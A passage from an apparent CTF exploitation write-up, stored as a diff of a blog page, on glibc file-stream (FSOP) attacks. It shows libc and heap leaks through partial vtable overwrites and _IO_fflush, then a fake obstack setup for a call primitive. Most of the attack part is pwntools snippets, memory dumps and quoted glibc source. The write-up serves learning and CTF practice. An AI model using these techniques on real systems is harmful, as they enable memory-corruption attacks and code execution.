+	  fp<span style="color:#ff79c6">-&gt;</span>_IO_backup_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+	}
+
+      <span style="color:#ff79c6">*--</span>fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> c;
+    }
+  <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span>) c;
+}
+libc_hidden_def (_IO_default_pbackfail)
+</code></pre></div><pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f
+0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490
+0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480
+0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480
+0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480
+0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
+</code></pre><p>Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at <code>fp-&gt;_IO_base_buffer &amp; ~0xff</code> (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:</p>
+<pre tabindex="0"><code>0x5649e8077400: 0x0000000000000000      0x0000000000000000
+0x5649e8077410: 0x0000000000000000      0x0000000000000000
+0x5649e8077420: 0x0000000000000000      0x0000000000000000
+0x5649e8077430: 0x0000000000000000      0x0000000000000000
+0x5649e8077440: 0x0000000000000000      0x0000000000000000
+0x5649e8077450: 0x0000000000000000      0x0000000000000000
+0x5649e8077460: 0x0000000000000000      0x0000000000000000
+0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011
+0x5649e8077480: 0x0000000000000000      0x0000000000000000
+0x5649e8077490: 0x0000000000000000      0x0000000000000000
+</code></pre><p>Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of <code>_IO_fflush</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_fflush</span> (FILE <span style="color:#ff79c6">*</span>fp)
+{
+  <span style="color:#ff79c6">if</span> (fp <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+    <span style="color:#ff79c6">return</span> _IO_flush_all ();
+  <span style="color:#ff79c6">else</span>
+    {
+      <span style="color:#8be9fd">int</span> result;
+      CHECK_FILE (fp, EOF);
+      _IO_acquire_lock (fp);
+      result <span style="color:#ff79c6">=</span> _IO_SYNC (fp) <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">EOF</span> : <span style="color:#bd93f9">0</span>;
+      _IO_release_lock (fp);
+      <span style="color:#ff79c6">return</span> result;
+    }
+}
+libc_hidden_def (_IO_fflush)
+</code></pre></div><p>It ends up calling <code>_IO_new_file_sync(fp)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_file_sync</span> (FILE <span style="color:#ff79c6">*</span>fp)
+{
+  ssize_t delta;
+  <span style="color:#8be9fd">int</span> retval <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+
+  <span style="color:#6272a4">/*    char* ptr = cur_ptr(); */</span>
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">&gt;</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base)
+    <span style="color:#ff79c6">if</span> (_IO_do_flush(fp)) <span style="color:#ff79c6">return</span> EOF;
+  delta <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end;
+  <span style="color:#ff79c6">if</span> (delta <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>)
+    {
+      off64_t new_pos <span style="color:#ff79c6">=</span> _IO_SYSSEEK (fp, delta, <span style="color:#bd93f9">1</span>);
+      <span style="color:#ff79c6">if</span> (new_pos <span style="color:#ff79c6">!=</span> (off64_t) EOF)
+	fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+      <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (errno <span style="color:#ff79c6">==</span> ESPIPE)
+	; <span style="color:#6272a4">/* Ignore error from unseekable devices. */</span>
+      <span style="color:#ff79c6">else</span>
+	retval <span style="color:#ff79c6">=</span> EOF;
+    }
+  <span style="color:#ff79c6">if</span> (retval <span style="color:#ff79c6">!=</span> EOF)
+    fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> _IO_pos_BAD;
+  <span style="color:#6272a4">/* FIXME: Cleanup - can this be shared? */</span>
+  <span style="color:#6272a4">/*    setg(base(), ptr, ptr); */</span>
+  <span style="color:#ff79c6">return</span> retval;
+}
+libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
+</code></pre></div><p>I already talked about the way we can gain arbitrary read with FSOP attack on <code>stdout</code> in <a href="../catastrophe">this article</a>. The way we will get a leak is almost the same, first we need to trigger the first condition in <code>_IO_new_file_sync</code> in such a way that <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> will trigger <code>_IO_do_flush(fp)</code>. Then <code>_IO_do_flush</code> triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#define _IO_do_flush(_f) \
+</span><span style="color:#ff79c6">  ((_f)-&gt;_mode &lt;= 0							      \
+</span><span style="color:#ff79c6">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
+</span><span style="color:#ff79c6">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
+</span><span style="color:#ff79c6">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
+</span><span style="color:#ff79c6">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
+</span><span style="color:#ff79c6">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
+</span></code></pre></div><p><strong>Condition</strong>:
+<code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</code> &gt;= <code>sizeof(uint8_t* )</code>, <code>(_f)-&gt;_IO_write_base</code> == <code>target</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_do_write</span> (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, size_t to_do)
+{
+  <span style="color:#ff79c6">return</span> (to_do <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>
+	  <span style="color:#ff79c6">||</span> (size_t) new_do_write (fp, data, to_do) <span style="color:#ff79c6">==</span> to_do) <span style="color:#ff79c6">?</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">:</span> EOF;
+}
+libc_hidden_ver (_IO_new_do_write, _IO_do_write)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">static</span> size_t
+<span style="color:#50fa7b">new_do_write</span> (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, size_t to_do)
+{
+  size_t count;
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_IS_APPENDING)
+    <span style="color:#6272a4">/* On a system without a proper O_APPEND implementation,
+</span><span style="color:#6272a4">       you would need to sys_seek(0, SEEK_END) here, but is
+</span><span style="color:#6272a4">       not needed nor desirable for Unix- or Posix-like systems.
+</span><span style="color:#6272a4">       Instead, just indicate that offset (before and after) is
+</span><span style="color:#6272a4">       unpredictable. */</span>
+    fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> _IO_pos_BAD;
+  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">!=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base)
+    {
+      off64_t new_pos
+	<span style="color:#ff79c6">=</span> _IO_SYSSEEK (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end, <span style="color:#bd93f9">1</span>);
+      <span style="color:#ff79c6">if</span> (new_pos <span style="color:#ff79c6">==</span> _IO_pos_BAD)
+	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+      fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> new_pos;
+    }
+  count <span style="color:#ff79c6">=</span> _IO_SYSWRITE (fp, data, to_do);
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">&amp;&amp;</span> count)
+    fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">=</span> _IO_adjust_column (fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>, data, count) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+  _IO_setg (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> (fp<span style="color:#ff79c6">-&gt;</span>_mode <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>
+		       <span style="color:#ff79c6">&amp;&amp;</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF <span style="color:#ff79c6">|</span> _IO_UNBUFFERED))
+		       <span style="color:#ff79c6">?</span> fp<span style="color:#ff79c6">-&gt;</span><span style="color:#8be9fd;font-style:italic">_IO_buf_base</span> : fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_end);
+  <span style="color:#ff79c6">return</span> count;
+}
+</code></pre></div><p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is the save buffer that has been allocated and switched in <code>_IO_default_pbackfail</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
+<p>The leak phase gives for me something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># do_allocate</span>
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xa8</span>), File<span style="color:#ff79c6">.</span>vtable)
+fflush()
+
+<span style="color:#6272a4"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x60</span>), File<span style="color:#ff79c6">.</span>vtable)
+fflush()
+
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xfbad1800</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x8000</span>), File<span style="color:#ff79c6">.</span>flags)
+
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x70</span>), File<span style="color:#ff79c6">.</span>_IO_write_base)
+
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x78</span>), File<span style="color:#ff79c6">.</span>_IO_write_ptr)
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xa0</span>), File<span style="color:#ff79c6">.</span>vtable)
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">1</span>), File<span style="color:#ff79c6">.</span>fileno)
+fflush()
+
+leak <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2160c0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2d160</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(leak)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</code></pre></div><h2 id="heap-leak">Heap leak</h2>
+<p>To use the <code>_IO_obstack_jumps</code> technique, we have to craft a custom <code>obstack</code> structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that&rsquo;s very easy, within the <code>main_arena</code> are stored some heap pointers, which means we just have to use the same <code>_IO_fflush</code> trick to flush the filestream and then leak a heap pointer stored in the <code>main_arena</code>. I wrote a function that leaks directly the right pointer from a given address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak_ptr</span>(ptr: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">int</span>:
+    <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">    We assume flags are right
+</span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
+
+    write_ptr(ptr, File<span style="color:#ff79c6">.</span>_IO_write_base)
+    
+    dest <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd;font-style:italic">int</span><span style="color:#ff79c6">.</span>from_bytes(ptr, byteorder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;little&#34;</span>)<span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>to_bytes(<span style="color:#bd93f9">8</span>, byteorder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;little&#39;</span>)
+
+    write_ptr(dest, File<span style="color:#ff79c6">.</span>_IO_write_ptr)
+
+    fflush()
+    ret <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+    <span style="color:#ff79c6">return</span> ret
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">[...]
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+leak_main_arena <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1ed5a0</span>
+
+heap <span style="color:#ff79c6">=</span> leak_ptr(pwn<span style="color:#ff79c6">.</span>p64(leak_main_arena)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2a0</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</code></pre></div><h2 id="obstack-exploitation">obstack exploitation</h2>
+<p>As far I know, <code>obstack</code> has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the <code>_IO_obstack_jumps</code> vtable looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">/* the jump table.  */</span>
+<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden <span style="color:#ff79c6">=</span>
+{
+    JUMP_INIT_DUMMY,
+    JUMP_INIT(finish, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(overflow, _IO_obstack_overflow),
+    JUMP_INIT(underflow, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(uflow, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(pbackfail, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(xsputn, _IO_obstack_xsputn),
+    JUMP_INIT(xsgetn, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(seekoff, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(seekpos, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(setbuf, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(sync, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(doallocate, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(read, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(write, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(seek, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(close, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(stat, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(showmanyc, <span style="color:#8be9fd;font-style:italic">NULL</span>),
+    JUMP_INIT(imbue, <span style="color:#8be9fd;font-style:italic">NULL</span>)
+};
+</code></pre></div><p>Given when <code>_IO_SYNC</code> is called in <code>_IO_fflush</code> the second argument is <code>0x1</code>, we cannot call functions like <code>_IO_obstack_xsputn</code> that need buffer as arguments, that&rsquo;s the reason why we have to dig into <code>_IO_obstack_overflow</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_obstack_overflow</span> (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#8be9fd">int</span> c)
+{
+  <span style="color:#ff79c6">struct</span> obstack <span style="color:#ff79c6">*</span>obstack <span style="color:#ff79c6">=</span> ((<span style="color:#ff79c6">struct</span> _IO_obstack_file <span style="color:#ff79c6">*</span>) fp)<span style="color:#ff79c6">-&gt;</span>obstack;
+  <span style="color:#8be9fd">int</span> size;
+
+  <span style="color:#6272a4">/* Make room for another character.  This might as well allocate a
+</span><span style="color:#6272a4">     new chunk a memory and moves the old contents over.  */</span>
+  assert (c <span style="color:#ff79c6">!=</span> EOF);
+  obstack_1grow (obstack, c);
+
+  <span style="color:#6272a4">/* Setup the buffer pointers again.  */</span>
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> obstack_base (obstack);
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> obstack_next_free (obstack);
+  size <span style="color:#ff79c6">=</span> obstack_room (obstack);
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">+</span> size;
+  <span style="color:#6272a4">/* Now allocate the rest of the current chunk.  */</span>
+  obstack_blank_fast (obstack, size);
+
+  <span style="color:#ff79c6">return</span> c;
+}
+</code></pre></div><p>The <code>struct _IO_obstack_file</code> is defined as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> _IO_obstack_file
+{
+  <span style="color:#ff79c6">struct</span> _IO_FILE_plus file;
+  <span style="color:#ff79c6">struct</span> obstack <span style="color:#ff79c6">*</span>obstack;
+};
+</code></pre></div><p>Which means right after the <code>vtable</code> field within the file stream should be a pointer toward a <code>struct obstack</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> obstack          <span style="color:#6272a4">/* control current object in current chunk */</span>
+{
+  <span style="color:#8be9fd">long</span> chunk_size;              <span style="color:#6272a4">/* preferred size to allocate chunks in */</span>
+  <span style="color:#ff79c6">struct</span> _obstack_chunk <span style="color:#ff79c6">*</span>chunk; <span style="color:#6272a4">/* address of current struct obstack_chunk */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>object_base;            <span style="color:#6272a4">/* address of object we are building */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>next_free;              <span style="color:#6272a4">/* where to add next char to current object */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>chunk_limit;            <span style="color:#6272a4">/* address of char after current chunk */</span>
+  <span style="color:#ff79c6">union</span>
+  {
+    PTR_INT_TYPE tempint;
+    <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>tempptr;
+  } temp;                       <span style="color:#6272a4">/* Temporary for some macros.  */</span>
+  <span style="color:#8be9fd">int</span> alignment_mask;           <span style="color:#6272a4">/* Mask of alignment for each object. */</span>
+  <span style="color:#6272a4">/* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
+</span><span style="color:#6272a4">     casts to the prototypeless function type in all assignments,
+</span><span style="color:#6272a4">     but having prototypes here quiets -Wstrict-prototypes.  */</span>
+  <span style="color:#ff79c6">struct</span> _obstack_chunk <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>chunkfun) (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>, <span style="color:#8be9fd">long</span>);
+  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>freefun) (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">struct</span> _obstack_chunk <span style="color:#ff79c6">*</span>);
+  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>extra_arg;              <span style="color:#6272a4">/* first arg for chunk alloc/dealloc funcs */</span>
+  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd;font-style:italic">use_extra_arg</span> : <span style="color:#bd93f9">1</span>;     <span style="color:#6272a4">/* chunk alloc/dealloc funcs take extra arg */</span>
+  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd;font-style:italic">maybe_empty_object</span> : <span style="color:#bd93f9">1</span>; <span style="color:#6272a4">/* There is a possibility that the current
+</span><span style="color:#6272a4">				      chunk contains a zero-length object.  This
+</span><span style="color:#6272a4">				      prevents freeing the chunk if we allocate
+</span><span style="color:#6272a4">				      a bigger chunk to replace it. */</span>
+  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd;font-style:italic">alloc_failed</span> : <span style="color:#bd93f9">1</span>;      <span style="color:#6272a4">/* No longer used, as we now call the failed
+</span><span style="color:#6272a4">				     handler on error, but retained for binary
+</span><span style="color:#6272a4">				     compatibility.  */</span>
+};
+</code></pre></div><p>Once <code>obstack_1grow</code> is called, if <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>, <code>_obstack_newchunk</code> gets called.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6"># define obstack_1grow(OBSTACK, datum)					      \
+</span><span style="color:#ff79c6">  __extension__								      \
+</span><span style="color:#ff79c6">    ({ struct obstack *__o = (OBSTACK);				      \
+</span><span style="color:#ff79c6">       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \
+</span><span style="color:#ff79c6">	 _obstack_newchunk (__o, 1);					      \
+</span><span style="color:#ff79c6">       obstack_1grow_fast (__o, datum);				      \
+</span><span style="color:#ff79c6">       (void) 0; })
+</span></code></pre></div><p><strong>Condition</strong>: <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">/* Allocate a new current chunk for the obstack *H
+</span><span style="color:#6272a4">   on the assumption that LENGTH bytes need to be added
+</span><span style="color:#6272a4">   to the current object, or a new object of length LENGTH allocated.
+</span><span style="color:#6272a4">   Copies any partial object from the end of the old chunk
+</span><span style="color:#6272a4">   to the beginning of the new one.  */</span>
+
+<span style="color:#8be9fd">void</span>
+<span style="color:#50fa7b">_obstack_newchunk</span> (<span style="color:#ff79c6">struct</span> obstack <span style="color:#ff79c6">*</span>h, <span style="color:#8be9fd">int</span> length)
+{
+  <span style="color:#ff79c6">struct</span> _obstack_chunk <span style="color:#ff79c6">*</span>old_chunk <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>chunk;
+  <span style="color:#ff79c6">struct</span> _obstack_chunk <span style="color:#ff79c6">*</span>new_chunk;
+  <span style="color:#8be9fd">long</span> new_size;
+  <span style="color:#8be9fd">long</span> obj_size <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>next_free <span style="color:#ff79c6">-</span> h<span style="color:#ff79c6">-&gt;</span>object_base;
+  <span style="color:#8be9fd">long</span> i;
+  <span style="color:#8be9fd">long</span> already;
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>object_base;
+
+  <span style="color:#6272a4">/* Compute size for new chunk.  */</span>
+  new_size <span style="color:#ff79c6">=</span> (obj_size <span style="color:#ff79c6">+</span> length) <span style="color:#ff79c6">+</span> (obj_size <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">+</span> h<span style="color:#ff79c6">-&gt;</span>alignment_mask <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">100</span>;
+  <span style="color:#ff79c6">if</span> (new_size <span style="color:#ff79c6">&lt;</span> h<span style="color:#ff79c6">-&gt;</span>chunk_size)
+    new_size <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>chunk_size;
+
+  <span style="color:#6272a4">/* Allocate and initialize the new chunk.  */</span>
+  new_chunk <span style="color:#ff79c6">=</span> CALL_CHUNKFUN (h, new_size);
+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>new_chunk)
+    (<span style="color:#ff79c6">*</span>obstack_alloc_failed_handler)();
+  h<span style="color:#ff79c6">-&gt;</span>chunk <span style="color:#ff79c6">=</span> new_chunk;
+  new_chunk<span style="color:#ff79c6">-&gt;</span>prev <span style="color:#ff79c6">=</span> old_chunk;
+  new_chunk<span style="color:#ff79c6">-&gt;</span>limit <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>chunk_limit <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) new_chunk <span style="color:#ff79c6">+</span> new_size;
+
